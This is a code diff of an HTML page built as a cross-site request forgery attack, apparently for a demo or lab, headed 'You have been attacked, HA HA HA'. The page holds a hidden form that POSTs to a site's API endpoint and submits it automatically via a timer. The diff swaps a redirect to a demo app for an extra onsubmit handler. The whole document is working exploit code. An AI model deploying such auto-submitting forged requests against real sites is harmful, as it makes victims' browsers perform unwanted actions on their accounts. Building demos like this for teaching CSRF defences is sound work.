@@ -8,7 +8,8 @@
     <h1>You have been attacked, HA HA HA</h1>
 
 
-    <form id="csrf-form" method='POST' action="https://tommy-design.test/api/weba/v3/site" onsubmit="window.location='https://csrf-demo-app.herokuapp.com/'">
+    <form id="csrf-form" method='POST' action="https://tommy-design.test/api/weba/v3/site" onsubmit="myfun()">
+      <input type="submit">
     </form>
  
     <script type='text/javascript'>
@@ -16,10 +17,9 @@
         document.getElementById('csrf-form').submit();
         sleep(2000);
       }, 3000)
-      setTimeout(function(){
-        window.location.replace('https://csrf-demo-app.herokuapp.com/')
-        sleep(2000);
-      }, 5000)
+      const myfun = function(){
+        document.getElementById('csrf-form').submit();
+      }
     </script>
   </body>
 
